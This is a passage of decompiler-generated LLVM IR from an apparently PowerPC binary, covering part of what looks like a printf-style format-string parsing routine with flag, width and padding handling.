  br i1 %v4_1000571c, label %dec_label_pc_10005750, label %dec_label_pc_10005724

dec_label_pc_10005724:                            ; preds = %dec_label_pc_1000571c
  %v2_10005724 = sub i32 %v1_10005724, %v0_10005734
  store i32 %v2_10005724, i32* @r31, align 4
  %v4_10005724 = icmp sgt i32 %v2_10005724, 0
  br i1 %v4_10005724, label %dec_label_pc_10005734, label %dec_label_pc_10005744

dec_label_pc_10005734:                            ; preds = %dec_label_pc_10005724
  %v0_1000573c = load i32, i32* %r24.global-to-local, align 4
  store i32 268457796, i32* @lr, align 4
  %v3_10005740 = inttoptr i32 %v0_1000573c to i16*
  %v4_10005740 = call i32 @function_100097d4(i32 %v0_10005734, i32 %v2_10005724, i16* %v3_10005740)
  %v1_10005744.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10005744

dec_label_pc_10005744:                            ; preds = %dec_label_pc_10005724, %dec_label_pc_10005734
  %v1_1000574c = phi i32 [ %v1_10005744.pre, %dec_label_pc_10005734 ], [ %v2_10005724, %dec_label_pc_10005724 ]
  %storemerge = phi i32 [ %v4_10005740, %dec_label_pc_10005734 ], [ 0, %dec_label_pc_10005724 ]
  %v4_10005744 = icmp eq i32 %storemerge, %v1_1000574c
  br i1 %v4_10005744, label %dec_label_pc_1000574c, label %dec_label_pc_10005ce4

dec_label_pc_1000574c:                            ; preds = %dec_label_pc_10005744
  %v0_1000574c = load i32, i32* %r23.global-to-local, align 4
  %v2_1000574c = add i32 %v0_1000574c, %v1_1000574c
  store i32 %v2_1000574c, i32* %r23.global-to-local, align 4
  %v0_10005750.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10005750

dec_label_pc_10005750:                            ; preds = %dec_label_pc_1000571c, %dec_label_pc_1000574c
  %v0_1000575c = phi i32 [ %v0_10005734, %dec_label_pc_1000571c ], [ %v0_10005750.pre, %dec_label_pc_1000574c ]
  %v1_10005750 = inttoptr i32 %v0_1000575c to i8*
  %v2_10005750 = load i8, i8* %v1_10005750, align 1
  %v3_10005750 = zext i8 %v2_10005750 to i32
  store i32 %v3_10005750, i32* %r0.global-to-local, align 4
  %v3_10005754 = icmp eq i8 %v2_10005750, 0
  br i1 %v3_10005754, label %dec_label_pc_10005ce8, label %dec_label_pc_1000575c

dec_label_pc_1000575c:                            ; preds = %dec_label_pc_10005750
  %v1_1000575c = add i32 %v0_1000575c, 1
  %v2_1000575c = inttoptr i32 %v1_1000575c to i8*
  %v3_1000575c = load i8, i8* %v2_1000575c, align 1
  %v4_1000575c = zext i8 %v3_1000575c to i32
  store i32 %v4_1000575c, i32* %r0.global-to-local, align 4
  %v3_10005764 = icmp eq i8 %v3_1000575c, 37
  br i1 %v3_10005764, label %dec_label_pc_10005708.backedge, label %dec_label_pc_1000576c

dec_label_pc_1000576c:                            ; preds = %dec_label_pc_1000575c
  store i32 %v2_100056a4, i32* @r29, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-340, align 4
  store i8* %v2_1000575c, i8** %stack_var_-200, align 4
  store i32 268457860, i32* @lr, align 4
  %v3_10005780 = call i32 @function_100060c8(i32* %v1_100056bc, i32 %v1_1000575c)
  store i32 %v2_100056a4, i32* @r3, align 4
  store i32 268457868, i32* @lr, align 4
  %v0_10005788 = call i32 @function_10005e18()
  store i32 %tmp60, i32* %r0.global-to-local, align 4
  store i32 %v2_10005790, i32* %r11.global-to-local, align 4
  store i32 %v4_10005794, i32* %r7.global-to-local, align 4
  br i1 %tmp73, label %dec_label_pc_100057b0, label %dec_label_pc_100057a4

dec_label_pc_100057a4:                            ; preds = %dec_label_pc_1000576c
  br label %dec_label_pc_100057b0

dec_label_pc_100057b0:                            ; preds = %dec_label_pc_1000576c, %dec_label_pc_100057a4
  %storemerge94 = phi i32 [ %v1_100057ac, %dec_label_pc_100057a4 ], [ %v2_10005790, %dec_label_pc_1000576c ]
  %v0_100057dc83 = phi i32 [ %v1_100057ac, %dec_label_pc_100057a4 ], [ %v2_10005790, %dec_label_pc_1000576c ]
  store i32 %storemerge94, i32* %r10.global-to-local, align 4
  store i32 %v2_100057b8, i32* %r8.global-to-local, align 4
  store i32 %v1_100057c0, i32* %ctr.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r11.global-to-local, align 4
  br i1 %tmp74, label %dec_label_pc_100057e0.preheader, label %dec_label_pc_100057e0.preheader.thread

dec_label_pc_100057e0.preheader.thread:           ; preds = %dec_label_pc_100057b0
  store i32 0, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_100057ec

dec_label_pc_100057e0.preheader:                  ; preds = %dec_label_pc_100057b0
  store i32 %tmp58, i32* %ctr.global-to-local, align 4
  br i1 %v3_100057bc, label %dec_label_pc_100057ec, label %dec_label_pc_100057d8.preheader

dec_label_pc_100057d8.preheader:                  ; preds = %dec_label_pc_100057e0.preheader
  store i32 %v0_100057dc83, i32* %stack_var_-344, align 4
  %v1_100057dc84 = add i32 %v0_100057dc83, 8
  store i32 %v1_100057dc84, i32* %r10.global-to-local, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r11.global-to-local, align 4
  %v1_100057e889 = add i32 %tmp58, -1
  store i32 %v1_100057e889, i32* %ctr.global-to-local, align 4
  %v2_100057e890 = icmp eq i32 %v1_100057e889, 0
  br i1 %v2_100057e890, label %dec_label_pc_100057ec, label %dec_label_pc_100057d8.dec_label_pc_100057d8_crit_edge

dec_label_pc_100057d8.dec_label_pc_100057d8_crit_edge: ; preds = %dec_label_pc_100057d8.preheader, %dec_label_pc_100057d8.dec_label_pc_100057d8_crit_edge.dec_label_pc_100057d8.dec_label_pc_100057d8_crit_edge_crit_edge
  %v1_100057d8.pre = phi i32 [ %v1_100057d8.pre.pre, %dec_label_pc_100057d8.dec_label_pc_100057d8_crit_edge.dec_label_pc_100057d8.dec_label_pc_100057d8_crit_edge_crit_edge ], [ %v2_100057b8, %dec_label_pc_100057d8.preheader ]
  %v1_100057e092 = phi i32 [ %v1_100057e0, %dec_label_pc_100057d8.dec_label_pc_100057d8_crit_edge.dec_label_pc_100057d8.dec_label_pc_100057d8_crit_edge_crit_edge ], [ 4, %dec_label_pc_100057d8.preheader ]
  %v1_100057dc91 = phi i32 [ %v1_100057dc, %dec_label_pc_100057d8.dec_label_pc_100057d8_crit_edge.dec_label_pc_100057d8.dec_label_pc_100057d8_crit_edge_crit_edge ], [ %v1_100057dc84, %dec_label_pc_100057d8.preheader ]
  %v3_100057d8 = add i32 %v1_100057d8.pre, %v1_100057e092
  %v4_100057d8 = inttoptr i32 %v3_100057d8 to i32*
  store i32 %v1_100057dc91, i32* %v4_100057d8, align 4
  %v0_100057dc = load i32, i32* %r10.global-to-local, align 4
  %v1_100057dc = add i32 %v0_100057dc, 8
  store i32 %v1_100057dc, i32* %r10.global-to-local, align 4
  %v0_100057e0 = load i32, i32* %r11.global-to-local, align 4
  %v1_100057e0 = mul i32 %v0_100057e0, 4
  store i32 %v1_100057e0, i32* %r0.global-to-local, align 4
  %v1_100057e4 = add i32 %v0_100057e0, 1
  store i32 %v1_100057e4, i32* %r11.global-to-local, align 4
  %v0_100057e8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100057e8 = add i32 %v0_100057e8, -1
  store i32 %v1_100057e8, i32* %ctr.global-to-local, align 4
  %v2_100057e8 = icmp eq i32 %v1_100057e8, 0
  br i1 %v2_100057e8, label %dec_label_pc_100057ec, label %dec_label_pc_100057d8.dec_label_pc_100057d8_crit_edge.dec_label_pc_100057d8.dec_label_pc_100057d8_crit_edge_crit_edge

dec_label_pc_100057d8.dec_label_pc_100057d8_crit_edge.dec_label_pc_100057d8.dec_label_pc_100057d8_crit_edge_crit_edge: ; preds = %dec_label_pc_100057d8.dec_label_pc_100057d8_crit_edge
  %v1_100057d8.pre.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_100057d8.dec_label_pc_100057d8_crit_edge

dec_label_pc_100057ec:                            ; preds = %dec_label_pc_100057d8.preheader, %dec_label_pc_100057d8.dec_label_pc_100057d8_crit_edge, %dec_label_pc_100057e0.preheader.thread, %dec_label_pc_100057e0.preheader
  store i32 %tmp57, i32* %r11.global-to-local, align 4
  br i1 %v3_100057f0, label %dec_label_pc_100057f8, label %dec_label_pc_10005818

dec_label_pc_100057f8:                            ; preds = %dec_label_pc_100057ec
  %v0_100057fc = load i32, i32* %r23.global-to-local, align 4
  store i32 %v0_100057fc, i32* @r6, align 4
  %tmp99 = icmp slt i32 %v0_100057fc, 0
  %v1_10005804 = zext i1 %tmp99 to i32
  %v2_10005804 = ashr i32 %v0_100057fc, 31
  %v3_10005804 = and i32 %v2_10005804, -2
  %v4_10005804 = or i32 %v3_10005804, %v1_10005804
  store i32 %v4_10005804, i32* @r5, align 4
  %v1_1000580c = call i32 @__asm_rlwinm(i32 %v0_10005928, i32 0, i32 20, i32 23)
  store i32 %v1_1000580c, i32* @r4, align 4
  %v1_10005810 = inttoptr i32 %v1_1000580c to i16*
  %v2_10005810 = call i32 @function_10009ab8(i16* %v1_10005810)
  br label %dec_label_pc_10005cd0

dec_label_pc_10005818:                            ; preds = %dec_label_pc_100057ec
  br i1 %v2_10005818, label %dec_label_pc_100059f4, label %dec_label_pc_10005820

dec_label_pc_10005820:                            ; preds = %dec_label_pc_10005818
  store i32 87, i32* %r31.global-to-local, align 4
  %v3_10005830 = load i8, i8* %v2_10005830, align 1
  %v4_10005830 = zext i8 %v3_10005830 to i32
  store i32 %v4_10005830, i32* %r30.global-to-local, align 4
  %v3_10005834 = icmp eq i8 %v3_10005830, 10
  br i1 %v3_10005834, label %dec_label_pc_1000583c, label %dec_label_pc_10005860

dec_label_pc_1000583c:                            ; preds = %dec_label_pc_10005820
  store i32 %v0_10005928, i32* %r0.global-to-local, align 4
  %v1_10005840 = call i32 @__asm_rlwinm(i32 %v0_10005928, i32 27, i32 31, i32 31)
  %v2_10005844 = icmp ne i32 %v1_10005840, 0
  %v1_10005850 = and i32 %v0_10005928, 64
  %v3_10005850 = icmp eq i32 %v1_10005850, 0
  %v1_10005854 = select i1 %v2_10005844, i32 44, i32 87
  store i32 %v1_10005854, i32* %r31.global-to-local, align 4
  br i1 %v3_10005850, label %dec_label_pc_10005860, label %dec_label_pc_1000585c

dec_label_pc_1000585c:                            ; preds = %dec_label_pc_1000583c
  %v1_1000585c = or i32 %v1_10005854, 128
  store i32 %v1_1000585c, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10005860

dec_label_pc_10005860:                            ; preds = %dec_label_pc_10005820, %dec_label_pc_1000583c, %dec_label_pc_1000585c
  %v0_10005860 = load i32, i32* %r11.global-to-local, align 4
  %v2_10005860 = icmp ugt i32 %v0_10005860, 5
  br i1 %v2_10005860, label %dec_label_pc_10005888, label %dec_label_pc_10005868

dec_label_pc_10005868:                            ; preds = %dec_label_pc_10005860
  %v3_10005868 = icmp eq i32 %v0_10005860, 3
  br i1 %v3_10005868, label %dec_label_pc_10005870, label %dec_label_pc_10005878

dec_label_pc_10005870:                            ; preds = %dec_label_pc_10005868
  store i32 55, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000588c

dec_label_pc_10005878:                            ; preds = %dec_label_pc_10005868
  %v3_10005878 = icmp eq i32 %v0_10005860, 1
  br i1 %v3_10005878, label %dec_label_pc_10005890, label %dec_label_pc_1000588c

dec_label_pc_10005888:                            ; preds = %dec_label_pc_10005860
  %v0_10005888 = load i32, i32* %r30.global-to-local, align 4
  %v1_10005888 = sub i32 0, %v0_10005888
  store i32 %v1_10005888, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000588c

dec_label_pc_1000588c:                            ; preds = %dec_label_pc_10005878, %dec_label_pc_10005870, %dec_label_pc_10005888
  br label %dec_label_pc_10005890

dec_label_pc_10005890:                            ; preds = %dec_label_pc_10005878, %dec_label_pc_1000588c
  %storemerge2 = phi i32 [ 11, %dec_label_pc_1000588c ], [ 6, %dec_label_pc_10005878 ]
  store i32 %storemerge2, i32* @r27, align 4
  %v3_10005890 = load i32, i32* %stack_var_-196, align 4
  store i32 %v3_10005890, i32* %r0.global-to-local, align 4
  %tmp76 = icmp sgt i32 %v3_10005890, -1
  br i1 %tmp76, label %dec_label_pc_100058a4, label %dec_label_pc_100058a0

dec_label_pc_100058a0:                            ; preds = %dec_label_pc_10005890
  br label %dec_label_pc_100058a4

dec_label_pc_100058a4:                            ; preds = %dec_label_pc_10005890, %dec_label_pc_100058a0
  %storemerge95 = phi i32 [ %v4_100058a0, %dec_label_pc_100058a0 ], [ 32, %dec_label_pc_10005890 ]
  store i32 %storemerge95, i32* @r26, align 4
  %v3_100058a4 = icmp eq i32 %v0_10005860, 1
  br i1 %v3_100058a4, label %dec_label_pc_100058c0, label %dec_label_pc_100058b0

dec_label_pc_100058b0:                            ; preds = %dec_label_pc_100058a4
  %v0_100058b0 = load i32, i32* %r7.global-to-local, align 4
  %v1_100058b0 = mul i32 %v0_100058b0, 4
  store i32 %v1_100058b0, i32* %r0.global-to-local, align 4
  %v0_100058b4 = load i32, i32* @r1, align 4
  %v2_100058b4 = add i32 %v0_100058b4, %v1_100058b0
  %v1_100058b8 = add i32 %v2_100058b4, 188
  %v2_100058b8 = inttoptr i32 %v1_100058b8 to i32*
  %v3_100058b8 = load i32, i32* %v2_100058b8, align 4
  store i32 %v3_100058b8, i32* %r0.global-to-local, align 4
  %v1_100058bc = call i32 @__asm_rlwinm(i32 %v3_100058b8, i32 0, i32 20, i32 23)
  br label %dec_label_pc_100058c0

dec_label_pc_100058c0:                            ; preds = %dec_label_pc_100058a4, %dec_label_pc_100058b0
  %v3_100058c0 = load i32, i32* %stack_var_-344, align 4
  %v0_100058c4 = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_100058c4, i32* @r5, align 4
  %v2_100058c8 = inttoptr i32 %v0_100058c4 to i32*
  %v3_100058c8 = call i32 @function_10009a38(i32 %v3_100058c0, i32* %v2_100058c8)
  store i32 %v0_100058c4, i32* %r7.global-to-local, align 4
  %v0_100058d8 = load i32, i32* %r31.global-to-local, align 4
  store i32 %v0_100058d8, i32* %r8.global-to-local, align 4
  %v6_100058e0 = call i32 @function_10009af4(i8* %v5_100058e0, i32 %v3_100058c8, i32 %v3_100058c0, i32 %v0_100058c4, i32 %v0_100058d8)
  store i32 %tmp57, i32* %r0.global-to-local, align 4
  store i32 %v6_100058e0, i32* %r30.global-to-local, align 4
  br i1 %tmp75, label %dec_label_pc_10005934, label %dec_label_pc_100058f4

dec_label_pc_100058f4:                            ; preds = %dec_label_pc_100058c0
  %v7_100058e0 = inttoptr i32 %v6_100058e0 to i8*
  %v3_100058f4 = load i8, i8* %v7_100058e0, align 1
  %v4_100058f4 = zext i8 %v3_100058f4 to i32
  store i32 %v4_100058f4, i32* %r0.global-to-local, align 4
  %v3_100058fc = icmp eq i8 %v3_100058f4, 45
  br i1 %v3_100058fc, label %dec_label_pc_10005904, label %dec_label_pc_10005918

dec_label_pc_10005904:                            ; preds = %dec_label_pc_100058f4
  %v1_10005904 = or i32 %v0_10005928, 2
  store i32 %v1_10005904, i32* %r0.global-to-local, align 4
  %v2_10005908 = add i32 %v6_100058e0, 1
  store i32 %v2_10005908, i32* %r30.global-to-local, align 4
  store i32 2, i32* @r27, align 4
  br label %dec_label_pc_10005934

dec_label_pc_10005918:                            ; preds = %dec_label_pc_100058f4
  %v1_10005918 = and i32 %v0_10005928, 2
  store i32 %v1_10005918, i32* %r0.global-to-local, align 4
  %v3_10005918 = icmp eq i32 %v1_10005918, 0
  br i1 %v3_10005918, label %dec_label_pc_10005928, label %dec_label_pc_10005920

dec_label_pc_10005920:                            ; preds = %dec_label_pc_10005918
  store i32 0, i32* @r27, align 4
  br label %dec_label_pc_10005934

dec_label_pc_10005928:                            ; preds = %dec_label_pc_10005918
  %v1_10005928 = urem i32 %v0_10005928, 2
  store i32 %v1_10005928, i32* %r11.global-to-local, align 4
  %v3_10005928 = icmp eq i32 %v1_10005928, 0
  br i1 %v3_10005928, label %dec_label_pc_10005934, label %dec_label_pc_10005930

dec_label_pc_10005930:                            ; preds = %dec_label_pc_10005928
  store i32 4, i32* @r27, align 4
  br label %dec_label_pc_10005934

dec_label_pc_10005934:                            ; preds = %dec_label_pc_10005928, %dec_label_pc_100058c0, %dec_label_pc_10005920, %dec_label_pc_10005904, %dec_label_pc_10005930
  %v0_100059a0 = phi i32 [ %v6_100058e0, %dec_label_pc_100058c0 ], [ %v2_10005908, %dec_label_pc_10005904 ], [ %v6_100058e0, %dec_label_pc_10005928 ], [ %v6_100058e0, %dec_label_pc_10005930 ], [ %v6_100058e0, %dec_label_pc_10005920 ]
  %stack_var_-184.0 = phi i32 [ %v0_10005928, %dec_label_pc_100058c0 ], [ %v1_10005904, %dec_label_pc_10005904 ], [ %v0_10005928, %dec_label_pc_10005928 ], [ %v0_10005928, %dec_label_pc_10005930 ], [ %v0_10005928, %dec_label_pc_10005920 ]
  %v3_10005934 = load i32, i32* %stack_var_-196, align 4
  store i32 %v2_10005b48, i32* %r0.global-to-local, align 4
  %v2_1000593c = sub i32 %v2_10005b48, %v0_100059a0
  %v1_10005940 = add i32 %v2_1000593c, 127
  store i32 %v1_10005940, i32* %r31.global-to-local, align 4
  %tmp77 = icmp sgt i32 %v3_10005934, -1
  br i1 %tmp77, label %dec_label_pc_10005950, label %dec_label_pc_1000594c

dec_label_pc_1000594c:                            ; preds = %dec_label_pc_10005934
  br label %dec_label_pc_10005950

dec_label_pc_10005950:                            ; preds = %dec_label_pc_10005934, %dec_label_pc_1000594c
  %v0_10005984 = phi i32 [ %v3_10005934, %dec_label_pc_10005934 ], [ 1, %dec_label_pc_1000594c ]
  store i32 %stack_var_-184.0, i32* %r0.global-to-local, align 4
  %v1_10005954 = and i32 %stack_var_-184.0, 16
  store i32 %v1_10005954, i32* %r11.global-to-local, align 4
  %v3_10005954 = icmp eq i32 %v1_10005954, 0
  br i1 %v3_10005954, label %dec_label_pc_100059a0, label %dec_label_pc_1000595c

dec_label_pc_1000595c:                            ; preds = %dec_label_pc_10005950
  store i32 %tmp57, i32* %r0.global-to-local, align 4
  br i1 %v2_10005960, label %dec_label_pc_1000596c, label %dec_label_pc_1000597c.thread

dec_label_pc_1000597c.thread:                     ; preds = %dec_label_pc_1000595c
  store i32 6, i32* @r27, align 4
  br label %dec_label_pc_100059a0

dec_label_pc_1000596c:                            ; preds = %dec_label_pc_1000595c
  br i1 %v3_1000596c, label %dec_label_pc_10005974, label %dec_label_pc_1000597c

dec_label_pc_10005974:                            ; preds = %dec_label_pc_1000596c
  store i32 9, i32* @r27, align 4
  br label %dec_label_pc_100059a0

dec_label_pc_1000597c:                            ; preds = %dec_label_pc_1000596c
  br i1 %v3_1000597c, label %dec_label_pc_10005984, label %dec_label_pc_100059a0

dec_label_pc_10005984:                            ; preds = %dec_label_pc_1000597c
  %v3_10005984 = icmp ugt i32 %v0_10005984, %v1_10005940
  br i1 %v3_10005984, label %dec_label_pc_100059a0, label %dec_label_pc_1000598c

dec_label_pc_1000598c:                            ; preds = %dec_label_pc_10005984
  %v1_1000598c = inttoptr i32 %v0_100059a0 to i8*
  %v2_1000598c = load i8, i8* %v1_1000598c, align 1
  %v3_1000598c = zext i8 %v2_1000598c to i32
  store i32 %v3_1000598c, i32* %r0.global-to-local, align 4
  %v3_10005994 = icmp eq i8 %v2_1000598c, 48
  br i1 %v3_10005994, label %dec_label_pc_100059a0, label %dec_label_pc_1000599c

dec_label_pc_1000599c:                            ; preds = %dec_label_pc_1000598c
  %v1_1000599c = add i32 %v2_1000593c, 128
  br label %dec_label_pc_100059a0

dec_label_pc_100059a0:                            ; preds = %dec_label_pc_1000597c.thread, %dec_label_pc_1000597c, %dec_label_pc_1000598c, %dec_label_pc_10005984, %dec_label_pc_10005950, %dec_label_pc_10005974, %dec_label_pc_1000599c
  %v1_100059e8 = phi i32 [ %v0_10005984, %dec_label_pc_1000597c ], [ 1, %dec_label_pc_1000598c ], [ %v0_10005984, %dec_label_pc_10005984 ], [ %v0_10005984, %dec_label_pc_10005950 ], [ %v0_10005984, %dec_label_pc_10005974 ], [ %v1_1000599c, %dec_label_pc_1000599c ], [ %v0_10005984, %dec_label_pc_1000597c.thread ]
  %v1_100059a0 = inttoptr i32 %v0_100059a0 to i8*
  %v2_100059a0 = load i8, i8* %v1_100059a0, align 1
  %v3_100059a0 = zext i8 %v2_100059a0 to i32
  store i32 %v3_100059a0, i32* %r0.global-to-local, align 4
  %v3_100059a4 = icmp eq i8 %v2_100059a0, 48
  br i1 %v3_100059a4, label %dec_label_pc_100059ac, label %dec_label_pc_100059e4

dec_label_pc_100059ac:                            ; preds = %dec_label_pc_100059a0
  %v0_100059ac = load i32, i32* @r27, align 4
  %tmp78 = icmp slt i32 %v0_100059ac, 6
  br i1 %tmp78, label %dec_label_pc_100059b8, label %dec_label_pc_100059b4

dec_label_pc_100059b4:                            ; preds = %dec_label_pc_100059ac
  store i32 11, i32* @r27, align 4
  br label %dec_label_pc_100059b8

dec_label_pc_100059b8:                            ; preds = %dec_label_pc_100059ac, %dec_label_pc_100059b4
  store i32 %tmp57, i32* %r0.global-to-local, align 4
  br i1 %v3_100059bc, label %dec_label_pc_100059c4, label %dec_label_pc_100059d4

dec_label_pc_100059c4:                            ; preds = %dec_label_pc_100059b8
  store i32 5, i32* %r31.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1000e05c.225 to i32), i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10005b60

dec_label_pc_100059d4:                            ; preds = %dec_label_pc_100059b8
  %v3_100059d4 = icmp eq i32 %v1_100059e8, 0
  br i1 %v3_100059d4, label %dec_label_pc_100059dc, label %dec_label_pc_100059e4

dec_label_pc_100059dc:                            ; preds = %dec_label_pc_100059d4
  store i32 0, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10005b60

dec_label_pc_100059e4:                            ; preds = %dec_label_pc_100059d4, %dec_label_pc_100059a0
  %v3_100059e4 = icmp ugt i32 %v1_100059e8, %v1_10005940
  %v2_100059e8 = sub i32 %v1_100059e8, %v1_10005940
  store i32 %v2_100059e8, i32* %r29.global-to-local, align 4
  br i1 %v3_100059e4, label %dec_label_pc_10005b80thread-pre-split, label %dec_label_pc_10005b60

dec_label_pc_100059f4:                            ; preds = %dec_label_pc_10005818
  br i1 %v2_100059f4, label %dec_label_pc_10005a28, label %dec_label_pc_100059fc

dec_label_pc_100059fc:                            ; preds = %dec_label_pc_100059f4
  %v3_100059fc = load i32, i32* %stack_var_-344, align 4
  %v0_10005a08 = load i32, i32* %r24.global-to-local, align 4
  store i32 268458520, i32* @lr, align 4
  %v5_10005a14 = call i32 @function_10009bf0(i32 %v0_10005a08, i32* nonnull %stack_var_-196, i32 268457464, i32 %v3_100059fc)
  %v1_10005a18 = icmp slt i32 %v5_10005a14, 0
  br i1 %v1_10005a18, label %dec_label_pc_10005ce4, label %dec_label_pc_10005a20

dec_label_pc_10005a20:                            ; preds = %dec_label_pc_100059fc
  %v0_10005a20 = load i32, i32* %r23.global-to-local, align 4
  %v2_10005a20 = add i32 %v0_10005a20, %v5_10005a14
  store i32 %v2_10005a20, i32* %r23.global-to-local, align 4
  br label %dec_label_pc_10005cd0

dec_label_pc_10005a28:                            ; preds = %dec_label_pc_100059f4
  br i1 %v2_10005a28, label %dec_label_pc_10005ad0, label %dec_label_pc_10005a30

dec_label_pc_10005a30:                            ; preds = %dec_label_pc_10005a28
  store i32 0, i32* @r25, align 4
  store i32 0, i32* %stack_var_-336, align 4
  %v3_10005a3c = load i32, i32* %stack_var_-344, align 4
  %v1_10005a44 = inttoptr i32 %v3_10005a3c to i32*
  %v2_10005a44 = load i32, i32* %v1_10005a44, align 4
  br i1 %v3_10005a28, label %dec_label_pc_10005a44, label %dec_label_pc_10005a98

dec_label_pc_10005a44:                            ; preds = %dec_label_pc_10005a30
  store i32 %v2_10005a44, i32* %r0.global-to-local, align 4
  %v3_10005a48 = icmp eq i32 %v2_10005a44, 0
  store i32 %v2_10005a44, i32* %stack_var_-340, align 4
  br i1 %v3_10005a48, label %dec_label_pc_10005b68, label %dec_label_pc_10005a54

dec_label_pc_10005a54:                            ; preds = %dec_label_pc_10005a44
  %v3_10005a54 = load i32, i32* %stack_var_-196, align 4
  store i32 %v3_10005a54, i32* %r0.global-to-local, align 4
  %v1_10005a5c = icmp slt i32 %v3_10005a54, 0
  br i1 %v1_10005a5c, label %dec_label_pc_10005a68, label %dec_label_pc_10005a64

dec_label_pc_10005a64:                            ; preds = %dec_label_pc_10005a54
  br label %dec_label_pc_10005a68

dec_label_pc_10005a68:                            ; preds = %dec_label_pc_10005a54, %dec_label_pc_10005a64
  %storemerge97 = phi i32 [ %v3_10005a54, %dec_label_pc_10005a64 ], [ -1, %dec_label_pc_10005a54 ]
  store i32 %storemerge97, i32* @r5, align 4
  store i32 %v2_10005a68, i32* @r3, align 4
  store i32 %v2_10005a6c, i32* @r6, align 4
  store i32 %v2_10005a68, i32* @r4, align 4
  store i32 268458616, i32* @lr, align 4
  %v0_10005a74 = call i32 @function_100095b4()
  %v3_10005a78 = icmp eq i32 %v0_10005a74, -1
  store i32 %v0_10005a74, i32* @r31, align 4
  br i1 %v3_10005a78, label %dec_label_pc_10005ce4, label %dec_label_pc_10005a84

dec_label_pc_10005a84:                            ; preds = %dec_label_pc_10005a68
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 32, i32* @r26, align 4
  store i32 0, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10005b80

dec_label_pc_10005a98:                            ; preds = %dec_label_pc_10005a30
  store i32 %v2_10005b48, i32* @r28, align 4
  store i32 268458668, i32* @lr, align 4
  %v3_10005aa8 = call i32 @function_10009558(i32 %v2_10005b48, i32 %v2_10005a44, i32 %v2_10005a6c)
  %v3_10005aac = icmp eq i32 %v3_10005aa8, -1
  store i32 %v3_10005aa8, i32* @r31, align 4
  br i1 %v3_10005aac, label %dec_label_pc_10005ce4, label %dec_label_pc_10005ab8

dec_label_pc_10005ab8:                            ; preds = %dec_label_pc_10005a98
  store i32 %v2_10005b48, i32* %r30.global-to-local, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 32, i32* @r26, align 4
  %v0_10005ac8 = load i32, i32* @r25, align 4
  %v1_10005ac8 = load i32, i32* @r28, align 4
  %v3_10005ac8 = trunc i32 %v0_10005ac8 to i8
  %v4_10005ac8 = add i32 %v1_10005ac8, %v3_10005aa8
  %v5_10005ac8 = inttoptr i32 %v4_10005ac8 to i8*
  store i8 %v3_10005ac8, i8* %v5_10005ac8, align 1
  %v0_10005b84.pre.pre = load i32, i32* @r31, align 4
  %v1_10005b84.pre.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10005b80thread-pre-split

dec_label_pc_10005ad0:                            ; preds = %dec_label_pc_10005a28
  br i1 %v2_10005ad0, label %dec_label_pc_10005b3c, label %dec_label_pc_10005ad8

dec_label_pc_10005ad8:                            ; preds = %dec_label_pc_10005ad0
  %v3_10005adc = load i32, i32* %stack_var_-344, align 4
  %v1_10005ae4 = inttoptr i32 %v3_10005adc to i32*
  %v2_10005ae4 = load i32, i32* %v1_10005ae4, align 4
  br i1 %v3_10005ad0, label %dec_label_pc_10005ae4, label %dec_label_pc_10005b14

dec_label_pc_10005ae4:                            ; preds = %dec_label_pc_10005ad8
  store i32 %v2_10005ae4, i32* %r30.global-to-local, align 4
  %v3_10005ae8 = icmp eq i32 %v2_10005ae4, 0
  br i1 %v3_10005ae8, label %dec_label_pc_10005b68, label %dec_label_pc_10005af0

dec_label_pc_10005af0:                            ; preds = %dec_label_pc_10005ae4, %dec_label_pc_10005b44
  %v0_10005b04 = phi i32 [ %v2_10005ae4, %dec_label_pc_10005ae4 ], [ %v3_10005b54, %dec_label_pc_10005b44 ]
  %v3_10005af0 = load i32, i32* %stack_var_-196, align 4
  store i32 %v3_10005af0, i32* %r0.global-to-local, align 4
  %v1_10005af8 = icmp slt i32 %v3_10005af0, 0
  br i1 %v1_10005af8, label %dec_label_pc_10005b04, label %dec_label_pc_10005b00

dec_label_pc_10005b00:                            ; preds = %dec_label_pc_10005af0
  br label %dec_label_pc_10005b04

dec_label_pc_10005b04:                            ; preds = %dec_label_pc_10005af0, %dec_label_pc_10005b00
  %storemerge98 = phi i32 [ %v3_10005af0, %dec_label_pc_10005b00 ], [ -1, %dec_label_pc_10005af0 ]
  store i32 %storemerge98, i32* @r4, align 4
  store i32 268458764, i32* @lr, align 4
  %v1_10005b08 = inttoptr i32 %v0_10005b04 to i8*
  %v2_10005b08 = call i32 @function_10007120(i8* %v1_10005b08)
  store i32 %v2_10005b08, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10005b74

dec_label_pc_10005b14:                            ; preds = %dec_label_pc_10005ad8
  store i32 1, i32* %r31.global-to-local, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 32, i32* @r26, align 4
  store i32 %v2_10005b48, i32* %r30.global-to-local, align 4
  store i32 %v2_10005ae4, i32* %stack_var_-328, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10005b80thread-pre-split

dec_label_pc_10005b3c:                            ; preds = %dec_label_pc_10005ad0
  br i1 %v3_10005b3c, label %dec_label_pc_10005b44, label %dec_label_pc_10005ce4

dec_label_pc_10005b44:                            ; preds = %dec_label_pc_10005b3c
  %v0_10005b44 = call i32 @function_10004b48()
  %v1_10005b4c = inttoptr i32 %v0_10005b44 to i32*
  %v2_10005b4c = load i32, i32* %v1_10005b4c, align 4
